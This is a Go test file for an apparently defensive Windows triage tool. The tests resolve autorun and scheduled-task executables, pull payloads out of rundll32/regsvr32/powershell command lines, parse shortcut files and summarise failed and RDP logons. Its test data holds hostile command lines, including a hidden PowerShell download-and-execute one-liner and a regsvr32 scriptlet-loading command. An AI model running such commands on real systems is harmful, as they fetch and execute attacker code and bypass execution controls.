package collect

import (
	"os"
	"strings"
	"testing"
)

func TestExecutablePath(t *testing.T) {
	root := os.Getenv("SystemRoot")
	if root == "" {
		t.Setenv("SystemRoot", `C:\Windows`)
		root = `C:\Windows`
	}
	t.Setenv("AE_TEST_DIR", `C:\Tools`)
	cases := map[string]string{
		`"C:\Program Files\App\app.exe" --background`:         `C:\Program Files\App\app.exe`,
		`C:\Program Files\App\app.exe --background`:           `C:\Program Files\App\app.exe`,
		`C:\WINDOWS\system32\svchost.exe -k netsvcs -p`:       `C:\WINDOWS\system32\svchost.exe`,
		`\SystemRoot\System32\smss.exe`:                       root + `\System32\smss.exe`,
		`\??\C:\Windows\system32\x.exe`:                       `C:\Windows\system32\x.exe`,
		`system32\DRIVERS\foo.sys`:                            root + `\system32\DRIVERS\foo.sys`,
		`%AE_TEST_DIR%\run.bat arg`:                           `C:\Tools\run.bat`,
		`C:\Windows\system32\userinit.exe,`:                   `C:\Windows\system32\userinit.exe`,
		`rundll32.exe C:\Users\x\AppData\evil.dll,EntryPoint`: `rundll32.exe`,
		`powershell -w hidden -c "iex (irm http://x)"`:        `powershell.exe`,
		`%AE_TEST_DIR%\svchost -k QQLiveService`:              `C:\Tools\svchost.exe`,
		`notes.txt`:                                           "",
		`"C:\unterminated.exe`:                                `C:\unterminated.exe`,
	}
	for in, want := range cases {
		if got := ExecutablePath(in); got != want {
			t.Errorf("ExecutablePath(%q) = %q, want %q", in, got, want)
		}
	}
}

// Review finding: persistence through signed Windows hosts resolved to the
// host, so the payload was never checked.
func TestPayload(t *testing.T) {
	t.Setenv("APPDATA", `C:\Users\u\AppData\Roaming`)
	sys := `C:\Windows\System32\`
	cases := []struct{ cmd, host, want string }{
		{`rundll32.exe C:\Users\x\AppData\Roaming\evil.dll,Start`, sys + "rundll32.exe", `C:\Users\x\AppData\Roaming\evil.dll`},
		{`"C:\Windows\System32\rundll32.exe" "%APPDATA%\a b\x.dll",Run`, sys + "rundll32.exe", `C:\Users\u\AppData\Roaming\a b\x.dll`},
		{`regsvr32 /s C:\Users\x\evil.dll`, sys + "regsvr32.exe", `C:\Users\x\evil.dll`},
		{`regsvr32 /s /n /u /i:C:\Users\x\a.sct scrobj.dll`, sys + "regsvr32.exe", `C:\Users\x\a.sct`},
		{`wscript.exe //B C:\Users\x\run.vbs`, sys + "wscript.exe", `C:\Users\x\run.vbs`},
		{`powershell -NoProfile -ExecutionPolicy Bypass -File C:\Users\x\s.ps1`, sys + `WindowsPowerShell\v1.0\powershell.exe`, `C:\Users\x\s.ps1`},
		{`cmd /c C:\Users\x\a.bat`, sys + "cmd.exe", `C:\Users\x\a.bat`},
		{`powershell -c "Get-Date"`, sys + `WindowsPowerShell\v1.0\powershell.exe`, ""},
		{`C:\Program Files\App\app.exe --x C:\y\z.dll`, `C:\Program Files\App\app.exe`, ""}, // not a script host
	}
	for _, c := range cases {
		if got := Payload(c.cmd, c.host); got != c.want {
			t.Errorf("Payload(%q) = %q, want %q", c.cmd, got, c.want)
		}
	}
	if got := ExecutablePath(`regsvr32 /s C:\Users\x\evil.dll`); got != "regsvr32.exe" {
		t.Errorf("ExecutablePath swallowed the switches: %q", got)
	}
}

func TestParseShortcut(t *testing.T) {
	cases := []struct{ file, target, args string }{
		{"testdata/notepad.lnk", `C:\Windows\System32\notepad.exe`, `--flag C:\x y.txt`},
		{"testdata/unicode.lnk", `C:\Windows\System32\cmd.exe`, `/c echo 測試`},
	}
	for _, c := range cases {
		b, err := os.ReadFile(c.file)
		if err != nil {
			t.Fatal(err)
		}
		s, err := ParseShortcut(b)
		if err != nil {
			t.Fatalf("%s: %v", c.file, err)
		}
		if !strings.EqualFold(s.Target, c.target) || s.Arguments != c.args {
			t.Errorf("%s = %+v, want target %q args %q", c.file, s, c.target, c.args)
		}
	}
	if _, err := ParseShortcut([]byte("not a link")); err == nil {
		t.Error("garbage parsed as a shortcut")
	}
	// Corrupt sizes must fail cleanly, not panic.
	b, _ := os.ReadFile("testdata/notepad.lnk")
	for n := 0x4C; n < len(b); n += 7 {
		ParseShortcut(b[:n])
	}
}

// FuzzParseShortcut: no input may panic (review finding: a LinkInfo shorter
// than its header fields crashed every scan).
func FuzzParseShortcut(f *testing.F) {
	for _, name := range []string{"testdata/notepad.lnk", "testdata/unicode.lnk"} {
		b, _ := os.ReadFile(name)
		f.Add(b)
	}
	crafted := make([]byte, 0x68)
	crafted[0] = 0x4C
	crafted[0x14] = lnkHasLinkInfo
	crafted[0x4C] = 0x10 // LinkInfoSize 0x10: smaller than the fields it declares
	crafted[0x54] = 1    // VolumeIDAndLocalBasePath
	f.Add(crafted)
	f.Fuzz(func(t *testing.T, b []byte) { ParseShortcut(b) })
}

func TestParseShortcutShortLinkInfo(t *testing.T) {
	crafted := make([]byte, 0x68)
	crafted[0] = 0x4C
	crafted[0x14] = lnkHasLinkInfo
	crafted[0x4C] = 0x10
	crafted[0x54] = 1
	if _, err := ParseShortcut(crafted); err == nil {
		t.Error("crafted short LinkInfo accepted")
	}
}

const tasksXML = `<?xml version="1.0" encoding="UTF-16"?>
<Tasks>
<!-- \Updater -->
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Settings><Enabled>true</Enabled></Settings>
  <Actions Context="Author">
    <Exec><Command>"%LOCALAPPDATA%\Vendor\update.exe"</Command><Arguments>/silent</Arguments></Exec>
  </Actions>
</Task>
<!-- \Microsoft\Windows\Defrag\ScheduledDefrag -->
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Settings><Enabled>false</Enabled></Settings>
  <Actions><Exec><Command>%windir%\system32\defrag.exe</Command><Arguments>-c -h</Arguments></Exec></Actions>
</Task>
<!-- \ComOnly -->
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Actions><ComHandler><ClassId>{X}</ClassId></ComHandler></Actions>
</Task>
</Tasks>`

func TestParseTasksXML(t *testing.T) {
	t.Setenv("LOCALAPPDATA", `C:\Users\u\AppData\Local`)
	t.Setenv("windir", `C:\Windows`)
	got, err := ParseTasksXML([]byte(tasksXML))
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 2 {
		t.Fatalf("got %d tasks, want 2 exec actions: %+v", len(got), got)
	}
	if got[0].Name != `\Updater` || got[0].Target != `C:\Users\u\AppData\Local\Vendor\update.exe` || got[0].Disabled {
		t.Errorf("task 0 = %+v", got[0])
	}
	if !strings.HasSuffix(got[0].Command, "/silent") {
		t.Errorf("args lost: %q", got[0].Command)
	}
	if !got[1].Disabled || got[1].Target != `C:\Windows\system32\defrag.exe` {
		t.Errorf("task 1 = %+v", got[1])
	}
}

// Third review, item 7: a task name containing "--" makes its comment invalid
// XML; it must not hide the other tasks, and the failure must be reported.
func TestParseTasksBadName(t *testing.T) {
	t.Setenv("LOCALAPPDATA", `C:\Users\u\AppData\Local`)
	doc := `<?xml version="1.0" encoding="UTF-16"?>
<Tasks>
<!-- \Before -->
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Actions><Exec><Command>C:\Users\u\a.exe</Command></Exec></Actions>
</Task>
<!-- \Bad--Name -->
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Actions><Exec><Command>C:\Users\u\b.exe</Command></Exec></Actions>
</Task>
<!-- \Broken -->
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Actions><Exec><Command>C:\Users\u\c.exe</Command></Exec></Wrong>
</Task>
<!-- \After -->
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Actions><Exec><Command>C:\Users\u\d.exe</Command></Exec></Actions>
</Task>
</Tasks>`
	got, err := ParseTasksXML([]byte(doc))
	if err == nil || !strings.Contains(err.Error(), "1 scheduled task") {
		t.Errorf("err = %v, want one unreadable task reported", err)
	}
	var names []string
	for _, a := range got {
		names = append(names, a.Name+"="+a.Target)
	}
	want := []string{`\Before=C:\Users\u\a.exe`, `\Bad--Name=C:\Users\u\b.exe`, `\After=C:\Users\u\d.exe`}
	if strings.Join(names, ",") != strings.Join(want, ",") {
		t.Errorf("tasks = %v, want %v", names, want)
	}
}

func TestLogons(t *testing.T) {
	ev := func(id int, ip, user, lt string) []byte {
		return []byte(`<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>` +
			itoa(id) + `</EventID><TimeCreated SystemTime="2026-09-25T10:00:00.1234567Z"/></System><EventData>` +
			`<Data Name="TargetUserName">` + user + `</Data><Data Name="LogonType">` + lt + `</Data>` +
			`<Data Name="IpAddress">` + ip + `</Data></EventData></Event>`)
	}
	var events []LogonEvent
	for i := 0; i < 25; i++ {
		e, err := ParseLogonEventXML(ev(4625, "203.0.113.9", "admin", "3"))
		if err != nil {
			t.Fatal(err)
		}
		events = append(events, e)
	}
	for _, x := range [][]byte{ev(4625, "-", "alice", "2"), ev(4624, "198.51.100.7", "alice", "10"), ev(4624, "10.0.0.5", "alice", "3")} {
		e, _ := ParseLogonEventXML(x)
		events = append(events, e)
	}
	if events[0].Time.IsZero() || events[0].LogonType != 3 || events[0].IP != "203.0.113.9" {
		t.Fatalf("parsed = %+v", events[0])
	}
	s := SummariseLogons(events, 24)
	if len(s.Failed) != 2 || s.Failed[0].IP != "203.0.113.9" || s.Failed[0].Count != 25 || s.Failed[1].IP != "local" {
		t.Errorf("failed = %+v", s.Failed)
	}
	if len(s.RemoteDesk) != 1 || s.RemoteDesk[0].IP != "198.51.100.7" {
		t.Errorf("rdp = %+v", s.RemoteDesk)
	}
	if !IsPublicIP("203.0.113.9") || !IsPublicIP("8.8.8.8") {
		t.Error("public IP not recognised")
	}
	for _, ip := range []string{"10.0.0.5", "192.168.1.2", "127.0.0.1", "local", "::1", "fe80::1"} {
		if IsPublicIP(ip) {
			t.Errorf("IsPublicIP(%q) = true", ip)
		}
	}
}

func itoa(n int) string {
	s := ""
	for n > 0 {
		s = string(rune('0'+n%10)) + s
		n /= 10
	}
	return s
}
